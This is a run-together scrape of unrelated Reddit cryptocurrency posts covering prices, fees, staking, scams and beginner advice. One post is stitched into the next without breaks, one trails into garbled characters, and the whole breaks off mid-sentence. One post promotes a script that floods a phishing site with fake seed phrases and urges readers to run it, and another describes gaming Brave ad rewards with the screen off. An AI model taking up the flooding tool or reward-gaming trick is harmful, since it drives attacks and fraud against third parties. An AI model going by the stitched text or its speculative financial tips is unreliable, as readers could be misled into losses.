Memecoins have been a hot topic since after Shiba Pumped, then Squid rugpulled ,but staying invested with Top Cryptos like BTC, ETH is a profitable strategy without any fear of getting rugpulled or scammed! If you are a new investor in Crypto and overwhelmed by the thousands of coin's in Crypto markets stick to the top projects !


Happy Holding Guys,

The post on the front page recently talking about how hype is all that matters when it comes to meteoric growth of coins is absolutely right, though I think there's a small difference in how that presents, and how it develops as time goes along.

There are those coins that thanks to hype or pumps will rise thousands of percent in a few weeks, only to then drop off and remain low forever. And there are those who have a slow, steady growth upwards, their hype a bit more controlled, and their buyers more informed. These coins might have great tokenomics and a good future, and even the hype to back themselves up, but there's one more thing they need if they want to keep growing: Momentum.

Let's take Cardano for example. For a few months it grew and grew, its hype continuing on at a nice and steady pace, all building up to the launch of the smart contracts. But now that they've launched, don't you think that its momentum has stalled? At least how I see it, I realized the hype was mostly still there, but the momentum had lagged behind, and without the growth most people expected from the launch of smart contracts, I figured we'd reached the ATH for a while, so I sold it and jumped into the ALGO ship right on time.

Hype is that initial lighting of the match, it can either explode and then burn itself out, or it can stay lit for a long while, growing slower but more steadily. But momentum is what will secure its future. What will stop it from fizzling out when people move on to other coins.

I feel like a lot of people jumped ship to ALGO and other similar coins like I did, and that's why ADA is lagging behind so much. And it's why they need to pick up the hype and momentum if they want to keep growing.

I got into crypto since February 2021 and relatively more heavily invested since about June. Ive always purchased with my credit cards. 

Recently I have tried purchasing some ALGO on Binance and some other coins con Crypto.con with 5 different credit cards from 4 different banks, Ive called them all up and some say its the business issue, some say there isnt even a charge attempt and just one bank told me their cards have been locked from purchasing on online crypto, casino, and betting. Its important to note too that I have never carried over any blanace to the next month and I always pay the card in full every period, its not like Im gambling with their money.

This is such bullshit. I have not tried debit cards but loosing a 2% cashback to try to outweight the exchanges fees somewhat makes me fucking mad.

Banks going out of their way to make everything crypto related more difficult even in this third world country.


Excuse the imperfect english.

Traders and investors were in a celebratory mood on Sunday as Bitcoin achieved its highest-ever monthly close of $61,200. October or ''Uptober'' as it was known throughout the month, saw a rise of close to 40%, Bitcoin's highest since December 2020. With strong buyer support in the high-$50,000s and not much resistance above $60,000, the near-term outlook remains positive. Even PlanB's stock-to-flow model has stayed on track, more or less; BTC could reach $98,000 if the model has to continue its historical accuracy.

Let's talk about the network fundamentals: last week, BTC recorded its eighth consecutive positive adjustment in difficulty, something that last happened in 2018. Difficulty rose to 21.89 trillion last week and is only 3 trillion away from the all-time high. Meanwhile, the hash rate is trending toward new highs; the weekly average hash rate now stands at around 159 EH/s which isn't that far from 180 EH/s in April.

Now normally this wouldn't even need to be said, but we all know how people in the crypto space react to those who help it grow. It happened with Elon Musk and many others before. It's okay to respect someone's decision to support crypto, but it's another thing to overtly praise them and think they can do no wrong because they support crypto.

It's something that, unfortunately, needs to be said.

But expanding on that post, I would also like to caution against the opposite.

I'm a regular guy from Argentina who only recently got into crypto, and I've heard the president of my country mention a few times that he thinks it might be possible to implement crypto into the economy. Aditionally, Javier Milei, another political candidate, has thrown his entire weight behind crypto, talking wonders about it and wanting to implement it all over.

Now, as an Argentinian I can tell you right now, they are both awful. Our president is a piece of shit, and while Javier Milei isn't quite as bad, I don't have much love for him either due to some of his proposed policies and beliefs. In general, I'd say pretty much every politician in Argentina is some flavor of awful, regardless of political party.

And yet when articles are posted here with said politicians' (and those from other countries too) support of crypto, people are sometimes quick to praise them and support them (wishing them to win elections) simply because of their support of crypto.

Meanwhile, there may be others who do not support crypto, who may even renounce it, but who might be much more respectable people and politicians, and better for their respective countries.

Remember; crypto's implementation into worldwide economies is pretty much a guaranteed thing, it's only a matter of how long it'll take. Politicians and famous people supporting it and wanting to make it happen is certainly a step in the right direction, but you should really take more than that into consideration when basing your opinion on said person.

Some people are integral to crypto's growth while being horrible in a lot of ways, and there are those who might be against crypto altogether but are still good people and even better politically or publically than the former. Don't judge people solely on their opinion of crypto. We are multi-faceted, after all.

Again, I wish this didn't need to be said, but it's just a reminder. Let's be happy when someone important supports crypto, and let's be disapproving when someone equally important dismisses it or warns against it, but let's not go further than that and paint them entirely as black on white based on that.

That's all. Hopefully this reminder is helpful, and I hope y'all have a good day.

I found this little guy 3 days ago and I am happy It is treating me well so far.  A quick search shows the only one offering staking is binance and that is the worldwide site, not what we are offered in the United States. Has any other company or entity picked this one up?  I want to set up some roots with this one before it doubles again! If there is a chance to get 8 to 10% stake program,  I would say that is very much worth it

It is listed on crypto.com which I found kind of funny, It seems to be a lot more grown up than a game token but believe me all the gains the CDC users grabbing  this week on  your game tokens is some serious grown up money  bravo!

Ive tried doing a recovery sign in with the master key but that doesnt seem to work either, or at least Ive not received an email with a code. Ive filled out the recovery form but who knows how long that will take, wondering if anyone has any ideas in the mean time? I still have access to the app on my phone but I cant unstake or transfer funds to my bank from there.

I had to stop work due to health problems in September and Ive used up all my savings so the crypto is next to go. I probably left it a bit late to sell as I need the money today but I wasnt expecting this to be an issue.

I want to know what types of things are the buzz in the media. Those kind of things that are gaining a lot of traction or things that are being brought up more in the crypto realm. Maybe some things that are getting the attention of people quickly. Kind of like dog coins. What other things out there are getting the attention of people who want to be involved in crypto. 

I know that gaming is one field, but there are also other things that are picking up quickly. It is kind of hard to keep up, so I'm missing some of these things. What in this time is getting people interested in crypto or is being searched the most?

TL;DR I buy tokens directly on the MATIC network (Layer-2 ETH network) using the Dharma app. This allows me to enter pools and stake LP tokens on SushiSwap at a fraction of the cost on ETH.

This is my first post and I may come to regret it if the yields on my pools start to decrease significantly. I've seen several posts in the last few months about the ridiculous fees associated with ETH. The gas fees for swapping tokens, approving and confirming pool entries, and staking LP tokens have become too expensive for most people using ETH. 

A few methods I've seen shared:

1. Buying MATIC on Gemini and taking advantage of their free monthly withdrawal. I haven't personally used this method and I'm pretty sure you can only buy erc20 MATIC, which means you'd still need a polygon bridge, thereby introducing ETH gas fees. The method below is a workaround I've seen.

2. Buying BEP20 MATIC, transferring it to BSC, and then using a BSC-Polygon bridge. There are other ways to use a polygon bridge, but most of them have prohibitively high fees. 

3. Using ALGO as an intermediary to MATIC (via USDT).

My personal method, which has saved me a significant amount in fees, is simply buying on the MATIC network using Dharma. I'm not shilling. I don't have anything to gain by sharing my method. It's a useful app that lets me buy tokens directly on the MATIC network. It costs about $2.50 per exchange, so I wouldn't buy less than $50-$100 at a time. Still, taking advantage of LPs using MATIC has been a godsend and the $2.50 transaction fee is minimal when compared ETH gas fees. MATIC pools also have pretty high returns compared to most ETH pools. Not financial advice. Open to feedback, clarifications, and questions.

So many amazing things happening with Ethereum and so much going on with layer 2's!! Ethereum also had its first deflationary week with Goldman Sachs raising their price Target to $8,000!

To those that have been holding all year you should be very happy with your portfolio. It's just amazes me to think of how early we actually are in all of this. Bitcoin and Ethereum are truly the revolution that we need in finance, away from all the corporate and political bullshit that has been allowed to happen for decades.

Cheers to all and looking forward to breaking the ceiling even further!!

In a press statement, Ripple noted that the partnership aims to bring instant, low-cost remittances to the area with the pilot project slated for the United Arab Emirates (UAE).

Through the partnership, Ripple aims to solve the pain points of traditional remittances that are known to be slow and costly. Notably, the company aims to leverage the markets colossal remittance size that stood at $78 billion in 2020 for Saudi Arabia and the United Arab Emirates combined.

Just as a disclaimer. I only hold the projects I really believe in. There was a time where I would like to go gamble at the casino with money I know I could loose. But this is so much more fun than the casino.

I am constantly online like many of us searching &amp; lurking. Sometimes I see a new listing or a project way down  percentage wise so I do a bit of research. If it sounds solid enough I say duck it and throw some gambling money in it. 

Thats why I started an individual ShitCoin Portfolio &amp; a Maybe Portfolio. Now these portfolios have outperformed some of of my other long term portfolios in short term (shit coins dont have much of shelf life) but I know long term it wont compare.

At the moment I am out of words with DREAMS just listed ( I think?) on KuCoin &amp; I am up an insane amount with a very small investment. Token info seems solid given the hype but still amazed.

Anybody else practice the same tactic? Im sure. So what are your stories? How have the gains or losses changed your perspective on the space? If you dont mind sharing; which ones? 

I never put anything in Squid. It was an easy no to me but maybe here we can bring perspective to those not as well versed in this fairly new space. I believe its almost the responsibility of the community to spread the best information we can, even to gamblers. This can individually change the whole mentality of a gambler to believe in the future of currency.

Head of IOG and chief of Cardano, Mr. Charles Hoskinson, has published some photos from Africa on Twitter to show that the Cardano tour around African countries continues, and he has been meeting the continents top politicians to talk about blockchain innovations with them.

Charles Hoskinson meets Zanzibar president and continents top politicians on Cardano Africa tour

In the published photos, Hoskinson is standing next to Zanzibars eighth president, Hussein Ali Mwinyi.

On Oct. 15, Hoskinson flew from the U.S. to Cape Town to participate in meetings dedicated to blockchain innovations in African countries conducted as part of the CiTi event.

In his speech, he suggested that, in the near future, Africa will be among the first world areas that will begin fully utilizing blockchain-based products, which is likely to ensure its progress in the tech and financial spheres.

I've seen this asked a few times but all the posts are from years ago. I was trying to find an app that can mine crypto. I'm aware it will fry my phone and I dont really care. I'm gonna buy cheap flipped androids and Xiaomis. Every video I find on the topic of mobile mining is spammed with bots and ads and I don't really trust it as well as all the older posts about this are  from years ago. Also as a side note if anyone has a link to a good introductory video or site that has helped you start out I would greatly appreciate having that resource.

What are some upgrades, listings on exchanges, halvings, court dates and other major events that could really affect a coin's future? 

I think this could actually help everyone make more informed decisions with their investments.

I was often caught by surprise after making a choice and wished I'd known those things before.

It's obviously impossible to read every news article there is.

So what are major events that are happening with the different crypto currencies in the near (or far) future?






Let's help each other.

I dont look down at WSB or people just gambling for money. I only look down at billionaire who don't pay taxes and who build penis to go just above a 787.

**Motivation**

Look at this sub growth, [https://subredditstats.com/r/cryptocurrency](https://subredditstats.com/r/cryptocurrency), the people who joined in 2020 and after are in majority, sharing the same motivation as WallStreetBets. 

What motivation? What has driven the growth are the same factors for WSB and CC. People cannot afford what their parent generation could and working harder does not work anymore. So, why not gamble?

**Hype**

The hype around meme coin wont last forever, just look at what people think of GME on WSB. People who used to say *Its not about the money, its about sending a message.* , are being laughed at.

Meme coin fundamental won't change, there is a reason why Amazon still exist. While most 2000 websites were focused only on their website, Amazon was developing AWS. Eventually, tech is important.

**Marketcap**

* Marketcap is not really relevant to determine the price of a coin. A coin will go up as long has new investor are willing to pay more.
* Marketcap is intangible, you don't see it. It's not like you go to a store and see a shelf full of unwanted product. It doesnt not matter that the market is 1 trillion coin, you dont see it, so it does not affect to decision on what it's worth.
* Hype coin is a pyramid, where there is an undisclosed agreement among investor. 
   * You have 2 type of people.

1. People who cares about the tech
2. People who don't care about the tech

Both know that it is a scam, they just know that as long people buy it, it will pump and if there is a rug pull well it was worth trying.

&amp;#x200B;

Too summarize, I think that hype coin, whatever what their market cap is can still pump 10000%, but on the long term, some good projects will become as dominant as microsoft, apple, google in the crypto-sphere and meme coin will disappear. There is a reason why some guy who had a web company in his garage in 2000 with a valuation at 10million doesn't exist anymore.

Recently I noticed that whenever I would post about an issue, problem or interest I had in the crypto space, I could just expect to get a Reddit chat request, followed by some semi-literal ape trying to get me to input my seedphrase in a shitty 2016 PHP form.

Beyond that, I've also noticed the massive amount of phishing sites and scam ads on Google whenever I try to get friends into crypto. I won't link any of them, but it truly sucks how easy it is to get turned away from crypto with all this bullshit, so I decided that I want to do something about it.

This is the v1 of my project with an attempt to just completely overload and annoy the crap out of scammers in order to get them to take down their websites and close up operations, or at least keep them on their toes. A framework of sorts that should make it easy for anyone to add websites that are illegitimate and need to be given some of their own medicine.

The codebase consists of a task-runner, a library of utilities as well as some tests. The task-runner makes it extremely easy to add more tasks for more scam sites or other ideas that we might have in the future to deal with scammers.

The library is meant to expand in the future with utilities such as functions for generating random seedphrases. But not just any random seedphrases. I decided to use the Python `better_profanity` library to generate seedphrases with only cursewords, such as the following:

    pasty menstruation gangbang knobjokey vulgar seduce fellate mothafuck screw strip kawk vixen queers slave kraut pussi smut breasts shagging motherfucker fooker arrse pantie fuckhead

# How To Use This Repository

For now, there's only one crypto phishing website pre-programmed with a spamming algorithm that just constantly enters those seedphrases to hopefully overload whatever cheap services they're running. My MacBook has been at it for mere minutes and is already at over 2K requests sent to the site, and I encourage you guys to add more so we can all blast these scammers.

Now specifically, here's how you guys can run the scripts that are contained in the repository if you guys aren't as tech-savvy:

1. Download [Python](https://www.python.org/downloads/) for your operating system and install it.
2. Clone the codebase by running `git clone` [`https://github.com/Dan6erbond/anti-crypto-scammer.git`](https://github.com/Dan6erbond/anti-crypto-scammer.git) in a terminal.
3. Change your current working directory to the repository by typing in `cd anti-crypto-scammer` in the same terminal as previously used for cloning it.
4. Install all the PIP dependencies with `python3 -m pip install -r requirements.txt`.
5. Run the script: `python3` [`main.py`](https://main.py)

The program will output a log to `log.txt` should you be interested in its progress. Errors will also be added to the log if any occur, hopefully making debug a bit easier for end-users trying to implement additional tasks.

# Adding Tasks

The [`main.py`](https://main.py) file will automatically load files from the `tasks/` folder and attempt to run their `main()` function using threading to facilitate parallel tasks. This should make it particularly easy to add more tasks that other users will then run whenever they update their repositories. Kind of like a decentralized attack on the scammers (see what I did there?) 

So adding new tasks is extremely easy. Create a new `.py` file in the `tasks/` folder and implement your logic. Use the `logging` package for logging purpose and add general functions to the `lib/` folder to your heart's content. Afterwards, create a pull request on the [GitHub Repository](https://github.com/Dan6erbond/anti-crypto-scammer) so others can join on the effort to take down these scammers.  Error handling is important, as to avoid crashing the entire program if something goes wrong in one script.

Yeah, LRC is pumping like crazy. We've all seen it. But that's not what makes me giddy (relevant username).

It's the ability to finally use ETH based DeFi for it's intended purpose. OpenSea (the main NFT platform) was the biggest gas guzzler just a few weeks ago, responsible for like 40% of the gas fees. That's beyond insane.

I still remember May. Gas tracker stopped counting gas price because it went over 1000, meaning over $500 for a simple Uniswap swap. I was basically blocked from taking profits as the cost for swapping was in most cases above the value od tokens I had on Uniswap. Some of them made 5-10x, and I would still be in loss if I swapped. Not to mention the transaction fees.

I did not use Uniswap since May, solely bcs it was inducing anxiety. What if I can't take my profits out due to high gas prices? 

If LRC suceeds, this would be a major breakthrough for DeFi. We could finally use them without such fears.

It's not just about the Loopring price. It's about sending a message.

I feel the present period in crypto is like when AC and DC electricity technologies were vying for wider adoption. Investors are trying to figure out which will become mainstream so we know which infrastructure to invest in. In our case, there are hundreds of possible technologies.

My question whether people think the number of cryptos with significant value will drop to a dozen or so, each for a specific function/field, with the rest falling away, or do you think it will be more like software where there are endless variants and having invested in any will still pay-off?

How does this affect your investment strategy today?

I'm not quite sure why I work this way. Hell, it could just be te big, fancy layout of Binance or Coinbase. But I'm still keen on putting my investments into a wallet. But whenever I have large amount of money sitting in, say, Metaask, I just can't shake the feeling that I'm going to come back to an empty wallet. 

To be honest ,and now that I'm actuall thinking about it.. it could just be an aesthetic issue. I never considered myself one to make decisions based on aesthetic. But to me, usng Metamask feels akin to storing  a couple thousan bucks in a big cardboard box while storing in Bianance. eels like ptting my feel money in a safe nder lock and cain, even thdough prettt l,       s                               \]ss

I have heard a lot of good things about the coin nano. I have also had great experiences with using nano. For those that are not familiar, nano is a coin that sends instant, and fee-less transactions.  

Everyone in the nano community pushes that once user adoption comes, nano will take off, as they say in most alt subs, but it seems like it took off in the past and did not sustain the growth. Do the majority of you not know about nano, or know about it but are not interested?

From what I understand here are the pros:

1. Fee-less - there are no gas fees to pay for transactions. I think this is huge in terms of utility. Why would anyone pay to use money when they can do it for free?

2. Instant - transaction happen in like 0.05 of a second or something crazy like that. Very convenient for transactions over large spaces. Dont have to wait for funds when paying which is really nice.

3. Green - there is still electricity used to send and receive nano, but it is so small compared to bitcoin it is practically negligible. 

4. market cap is 815 million. 

Cons:

1. No layer 2 functionality. Devs believe you do not need smart contracts or anything besides just the coin, because all that other stuff can be done off chain.

2. I got no more cons.


I think nano is super useful, I use it to send between exchanges so I dont have to pay gas fees, and looking at that market cap there is a shitload of room to go. What do you guys think, are there cons I am unaware of? Is there a reason why the price spiked to 21 and dropped again in the past? 

Thanks all!

TLDR:
Nano is fast fee-less and green with a 815 mil market cap. Are there any reasons I should not invest?

I'll just get to the point:

* How can you know for sure that a burn wallet is "lost"? Couldn't someone still have the keys and eventually in the future just take everything?
* How does circulation account for lost coins? For example, if I threw my heard drive into the ocean, my coins would be forever lost. Do they stay in the circulation count? Do inactive coins age out eventually?
* I thought I had a third thing but I guess that's all

Most of you know probably that Brave is a browser which rewards you with a token called BAT every time you watch a sponsored ad. Brave is a really nice browser based on Chromium with lots of privacy features and the built-in adblock is awesome, especially on mobile.

I've been using the Brave browser as my main browser both on desktop and mobile for quite a while now and tbh I would use it even if there were no BAT rewards at all.

So, now let's have a look at the methods on how to earn BAT easily. 

Earning BAT won't make you rich, but if you can make some extra without doing anything, why not? 

I found 2 methods to see more ads and therefore earn more BAT. Remember that you don't have to click on the ads in order to earn BAT.

The first method is really simple. Just go to the Brave rewards settings and set the ads cap to 10 per hour. Until last month, the maximum was 5, but they changed it.

The second method only works on Android. I don't know if it works on every phone, but it does on mine. It doesn't work on iOS as Apple doesn't allow token rewards.

With your phone on charge, open Brave, go to a web page with a video on it, start the video and then pause it. The screen will go black after a minute or so because the video is paused.

For some reason, even though the screen is black, you'll keep getting rewards notifications as if you were actively browsing. It's probably an exploit.

So, if you're not using your phone, just let it charge with a paused video and the screen turned off, and you'll keep earning BAT.

Again, these methods will not make you rich. You can maybe earn $10 per month or so but I'm bullish on BAT. It's a good concept, it's moving up and Alt Season hasn't started yet. More and more people are starting to use Brave, imho it can only grow from there.

Im not going to say there arent doxxed teams and projects out there. Because there are some. Ive seen some. And I wish I was seeing more. This change Ive wanted to see is why in large part I helped found RickMortyDoxx after a serendipitous series of events that had me come on as the second to last founding member I believe.

I already had a project in mind that I was slow seeding the Intellectual Property for. Hoping to launch in March or even May of 2022 (may get there next year, fingers crossed that it is a part of this larger project and starting movement). But I got burned by Rick and Morty ERC20 (also known as V1). Burned for a couple grand. Not a lot in the grand scheme of things. But still a lot that didnt have to be lost because of either incompetence or malfeasance of the developers behind it. 

The coin has gone dead quiet and Ive been told that the marketing wallet still has money in it at this time but I believe the token is what most would call dead as a result of a rug pull. And the problem that stems from that, in my mind. Is the series of even misevents that led to the failed V2 attempt (or scam, take your pic, YMMV, in my opinion scam) which cost folks even more money that had much of the same developers and what as I understand it (do your own research). And the greater public still has no idea of who these people are. What they were doing. How they were doing it. Or even if they will do it again. 

Anonymity prevents accountability. It leaves the public vulnerable and in danger of being preyed on again, and again, and again. The predators, thieves, scammers, and frauds just change their online names and presences. Changing their Telegram names and Twitter handles. Working among each other to bestow a possible fake and artificial degree of credibility that the unwary and unsuspecting are in danger of falling prey to. Losing their money in rug pulls, slow and fast alike, i.e. [Squid Game Token](https://gizmodo.com/squid-game-cryptocurrency-scammers-make-off-with-2-1-m-1847972824). When more elaborate Wealth Extraction methods are not used.

Doxxed, is about being the opposite of anonymity. It is about putting your name and reputation on the line. To show you take your actions and undertakings seriously, in cryptocurrency. To show you are prepared to take a risk on people knowing your name and face, and if you fail due to malfeasance or incompetence, you will not likely be able reenter the space of being trusted with another persons money in cryptocurrency. Those who risk nothing, are likely not going to value your money seriously, in my opinion.

So when you sit back and give it some thought; among all the shadiness, all the fraud and gatekeepers playing among themselves and painting the illusion of fair play. Doxxed is counterculture:

\- Counter To Rug Pulls and Theft

\- Counter To Insider Dealing 

\- Counter To Scammers

\- Counter To Pumps and Dumps

\- Counter To Fake and Fraudulent Influencers

\- Counter To Exploiting Holders' Hopes and Dreams

\-Counter To Bad Acting Predators and Extractors Of Liquidity

&amp;#x200B;

\- Counter To Innocent People Losing Their Money For No Legitimate Reasons

If people cant show you who they are, do they deserve your trust and money?

Y'all are smart, no need to write in detail.

 Answers:

1 Ethereum scaling protocol.

2. Requires traditional bank account.

3. Loopring's governance token.

Not that anyone can fail, this is not a real test. 
Amount is $1.50. Not as much as others in the past but a buck is a buck (ignoring inflation!)

Of course, I got this post removed 7 hours ago after I posted it, as I totally forgot about the character count thingy. I suppose our college years are back upon us, we can't just say what we need directly, we need to add on extra letters. 


Do you think once EM can implant his mind controlling device aka Neurolink into our skulls, we will need to text at all? 

BTW. 500 characters is between 70 and 130 words with spaces included. If spaces not included, then it is between and 170.

Let's see if I make it this time. 

(Pardon if someone else already shared this info.)

Today the hard work of your labor is being rewarded. All the shitpoists, all the TAs that never hit the target, all the moonshots you tried to shill and got rekt for it! It's all coming to tommorow's special day. Brush your teeth, wear a good suit, and give a handshake to your fellow redditors who got you where you will be tommorow. Work on your "parade walk" as if you are in wolves of wall street. Order that expensive 3$ wine bottle (as you have been drinking only water and eating cookies the past month to increase your investment). YOU DESERVE IT. Though tommorow is a good day, the day after you forget about all this and dive back into shitposting. Cause you can rest only when all the moons have been distributed. SALUTE!

 There are limited circumstances in which you can obtain possession of the Crypto Assets you have purchased (see Closed Loop System below). The Crypto Assets that you have purchased will be held in trust for you, in a pooled account that is in the name of WDA, at a third-party custodian independent of WDA. As such, there is a risk you will not be able to successfully obtain possession of the Crypto Assets, and a risk that the assets in this pooled account will not be sufficient to ensure that you receive the value of your interest in the Crypto Assets.

Hey everyone,

I feel like this should be an easy answer, but after searching I havent found it.

I am looking for a simple staking platform, Im open to anything from staking platforms to wallets and exchanges, where I can stake DOT, ADA, and ATOM.

Heres the kicker, I would love to find something that isnt going to cost me an arm and a leg when I go to withdraw anything. I've hear of  Sifchain, Daxetoken, Anchor Protocol but would like to get your opinions.

\*PS - I am in the States so Binance is out of the question.

Any suggestions would be greatly appreciated. Thank you.

We were 3 in the office. Things started really well. One of the colleagues told us that crypto is a scam and decided to leave the conversation. He took his coffee and went out  

The second guy was pretty much involved in the space and he was fascinated with all the opportunities that crypto opens up for government, corporations and regular people. 

We discussed opportunities that DAO brings. That you can have autonomous charity, autonomous and fair elections and all sorts different companies. 

Then we discussed metaverse. Imagine that you can use your VR set to go shopping without leaving your apartment. Like you went to the NIKE store in the metaverse, bought blueprint of shoes and printed them on your 3D printer. Thats insane. 

Then the guy asked me what crypto do I hold. So I said BTC, ETH privately with a bunch of promising alts. Then I asked him and he told me following - I do hold XRP and a tiny bit of BTC. But almost all of my capital is in the HEX. Would you like me to tell you more about that project? 

How should we call that poor guy?

I am the author of the post ''Crypto 101 - the Do's and Dont'ts of Crypto investing.'' that was trending 4 days ago. -[https://np.reddit.com/r/CryptoCurrency/comments/qi8azn/crypto\_101\_the\_dos\_and\_donts\_of\_crypto\_investing/](https://www.reddit.com/r/CryptoCurrency/comments/qi8azn/crypto_101_the_dos_and_donts_of_crypto_investing/)

For the new comers - I suggest giving it a read, it has valuable information which would prevent you doing the rookie mistakes I've done in the past.

This is part 2, consisting of the top comments on the first post. I gathered and listed everything that is advice-worthy in my opinion. The source here is you, the redditors.

\-**Don't listen to advice on the internet**  
Top comment. Although a meme in this case it does have some truth in it. Nobody on the internet has his heart on you and nobody cares if you win or lose. Odds are, strangers want you to lose to make them feel better on either their losses or to boost their ego on their profits.Take everything you read on the internet with a grain of salt.

\-**Always buy high, sell low**  
This one is also a used as a meme, but if you flip it around is actually a valuable piece of advice. In order to profit, you are supposed to buy something at a low price and sell it at a higher price. In crypto reality though, I would paraphrase to ''buy when it's red, sell when it's green, don't chase pumps and if your coin is dumping - wait it out, don't sell it at a loss. It's time will come'' This considering you are investing in a serious project, ofc.

**- Do not dump more money into the crypto coin after it pumps in hopes of getting more gains.**This one might come out as a bit controversial, but it's mostly a situational thing, learned through blood. The long story short here is this. If a coin has already pumped, the chances of it pumping again are slimmer than it having a correction back down. Investing more in an already pumped coin has a higher risk, lower reward ratio. Avoid it. Unless ofc. news suggest otherwise.

**- It's safer to keep your coins on an exchange, rather than a cold wallet.**  
This is one I don't really agree on, but many people do, so I will explain a bit more and let you decide for yourself.In the past crypto exchanges used to be hacked all the time, people got robbed out of their coins constantly. Now, established exchanges don't get hacked, or rarely and safety is much better.However, cold wallet being the safest option in general does have it's drawbacks. If you lose your seed phrase - your coins are lost. Turns out many people manage to lose theirs.Some redditor pointed out that living with roommates makes hiding your phrase a whole lot harder than having 2FA on your phone to your exchange. And, if you manage to lose all your access to the exchange, they can retrieve it through KYC.I agree, for some people it might be safer to keep their coins on an exchange.Please just use the top 3 exchanges in that case.

**- Don't buy the popular sentiment. Look at the fear and greed charts.**  
This is probably a big one. Learn how to read popular indicators and base your actions on them. People around you can be very misleading in their sentiment, either overbullish or overbearish.It's very easy to fall into the trap of following someone who seems to have a bit more knowledge of crypto than you. Don't.Learn yourself.

\-**Don't send any coins to anybody to "confirm your address". Nobody will amplify your coins, it's a scam.**  
These are some of the most popular scam tactics. Scammers will always promise some big reward, but you have to be the one taking the first step in transactions for some tiny amount of money in order to receive the big money. Do you remember the popular Nigerian prince email scam years ago? Basically the same thing.Don't send anyone money, nobody in this world will spend even a minute of his own time to help you win big.

**- Do your own research and form your own opinion.**  
This one seems pretty obvious, but I will add to that. Choose your sources of information wisely. Take everything with a grain of salt, compare points of view and than form your own opinion. We all know about the recent Squid scam. Many people fell into it because of BBC posting an article.Yes, that BBC.Some months ago popular news websites announced that Wallmart will accept Litecoin, than some other websites published that aswell. Turned out to be fake news, but many people lost a lot of money because they trusted unreliable sources.

\-**Don't forget about the IRS because I guarantee you that the IRS won't forget about you.**  
Taxes. Remember that you have to pay taxes on everything you make. Try to look at this as a good thing.You want an ambulance when your beloved one is sick? That comes from taxes.You want a firetruck when you have your house catches fire? That comes from taxes.You want to be able to count on the police doing their job? Taxes.Clean roads, streets, parks - all that comes from taxes. It's a comfort we all take for granted. Don't be like this, in order for a society to work - pay taxes.

**- Have an exit plan for each coin and write it down. Don't allow greed to control you not making profit.**  
Really, write down a plan and follow it.Nobody knows when the bull market will end, but we all know it will end at some point and all coins have 80-95% correction, basically wiping out all your profits and putting you in the bloody red. It's easy to fall victim of your own greed when things go parabolic, but remember, that's how people lose their money overnight.Follow your plan.

**- Only invest what you can stand to lose.**  
At this point this one sounds more like a cliche to the OGs here, but you would be surprised how many of the new retail money flowing into the market when the FOMO hits comes from loans, mortgages and basically money people cannot afford to lose without messing up their lives. Don't do it. Better have a smaller profit from your own money than lose your home/car/lifesavings.

I doubt I am going to make a part 3 of this.I hope this makes your learning experience not-so-rough, because some of these have been written with tears. :)

Hi all

I'm not getting much love by the FIRE sub only because I'm trying to understand why they don't like cryptos. 

To me cryptos are exactly that Financial Independence Retire Early but every time I'm mentioning cryptos, I'm getting downvoted like crazy.

Even just trying to understand why the FIRE community hates cryptos so much, I'm simply getting hated for mentioning it. 

It looks like that FIRE people in general are an extremely conservative bunch of people but I simply don't understand why cryptos is such a controversy for them. 

I tried to ask the FIRE sub directly but mainly got BS responses, so I was hoping to get some enlightenment here.

I saw quite a few posts about crypto gaming lately, a lot of them just disregarded its right to exist. But honestly, I think those people are completely wrong. For me, whose passion is gaming since I was young, the idea of being able to make some money while having fun in a video game is mindblowing. And I'm not talking about getting millions or doing it as a full-time job, rather just as a bit of plus. As an example Cryptoroyale. I'm sure there are a lot of people who spent hundreds of hours on agar io just for pure fun. Now you can do the same in Cryptoroyale, but you can actually get back some crypto.  
I know that now most (but importantly not all of them) of the crypto games are pure trash, but we have to understand that we are still very early in this. And I truly believe that the future of the gaming industry is not what we know so far, but it is in crypto.   


I can't wait for a FIFA-like game where instead of throwing money out of the window every year to build a good team in the newest version, you actually own the cards as NFTs, and you could sell them whenever you want. I can't wait for a cool MMORPG where the collected items are NFTs. I can't wait for games where after you buy the battle pass, you can earn skins and crypto back by leveling up.   


The opportunities are endless, but I'm sure if the gaming companies play this right (looking at you ~~China~~ Steam), we have a bright future ahead of us in gaming.

Hey everyone, Ive been using Coinbase Pro to buy BTC and want to DCA out and into ETH. 
I want to set limit orders. For example, if BTC hits my USD price target, trigger limit sell of BTC, and auto-buy ETH. Is this possible in one trade? If not, is there an automated way to do this? If not, are there other exchanges I can do this in the US?  If not, do you have any trusted, effective systems in place to aid in something like this?

Im not understanding how to accomplish this on the Coinbase Pro ETH-BTC Order Form. I dont know what amount of ETH or what BTC limit price to set.

With help from my wife (who is an accomplished Data Scientist), we (she) wrote a code using Python and PRAW. - I'm in marketing and have an addiction to crypto, so, pretty much just make it pretty each month.

The code pulls the top 1000 posts from the past month at CryptoCurrency, analyzing for any specific coins mentioned (Ticker abbreviation or full name), from which, the total number (and resulting ranking) is then produced. 

We built a database for the tool referencing CoinGecko, which includes the Top 1000 coins by market cap (plus MOON coin).

Any traditional banks accept crypto as an asset for collateral/lending?

Met someone a couple of days ago who struck up a conversation about crypto.

They were telling me how they couldnt invest in it because it just seemed like a scam and no use baloney.

When I asked them if they knew you could earn yield in crypto they had no. Idea.

They had just finished up their argument about how bad crypto is, just a pump and dump for the next biggest sucker.

Then the kicker.. I asked if they own any and they say oh yeah some of that DOGE and SHIB.

I think many people here can understand just how frustrating this is.

I will continue holding ethereum coin and possibly buy more,  but its literally so fucking ridiculous how much the fees are to do anything on the blockchain.  Every "smart contract call" is at least $80 and its just to change one little thing on my ENS, or to swap a coin, or any other little thing.

How are we supposed to make anything if we have to pay at least double for everything we do.   

I know nobody cares at all about one person not using ethereum anymore.  But i just spent like 2 hours and $200 to come out empty handed.  Now i have $100 in a token that I cant even convert without $80 in ethereum.  Fucking pissed.

Bullshit

Defi as we know has Staking, Lending/borrowing, Yield farming &amp; much more among its benefits. I'm someone that actually likes putting my assets to work

So what platforms are you guys earning juicy yields on your assets. I'm already earning good APYs on Sifchain, Daxetoken, Anchor Protocol

I will like to know other defi protocols I can leverage on, while the bull market is still on

Have you ever done it? How often do you do it?

Ive taken some of my smaller holdings (which Ive had for a while and Im all in the green on) and converted them to add to my bigger bags. Finally decide to go depth into a few projects rather then width across multiple. 

How do you look at it? 

Whats your best tips and practices for someone who is about to do this for there first time? Or for someone who does it as often as needed and maybe doesnt know a certain trick you do! 

(For context I took my smallest 5/6 bags and converted them into my 3rd bag which then became my biggest after this)

I have been a silent reader on this sub for quit a while and I have been investing in the crypto space for a couple years heres what my experience tells me : 

